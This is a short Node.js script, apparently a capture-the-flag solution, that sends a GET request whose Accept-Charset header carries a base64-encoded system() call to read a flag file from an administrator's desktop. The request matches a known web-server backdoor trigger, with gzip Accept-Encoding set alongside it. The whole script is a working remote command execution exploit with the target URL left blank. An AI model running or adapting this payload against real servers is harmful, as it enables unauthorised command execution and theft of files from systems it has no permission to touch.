const axios = require('axios');
const cmd = Buffer.from('system("cd c://Users/admin/Desktop/ && type flag.txt.txt");');

async function run() {
    const r = await axios({
        method: 'GET',
        url: '',
        headers: {
            'accept-encoding': 'gzip,deflate',
            'accept-charset': cmd.toString('base64'),
        },
    });
    console.log(r.data);
}

run();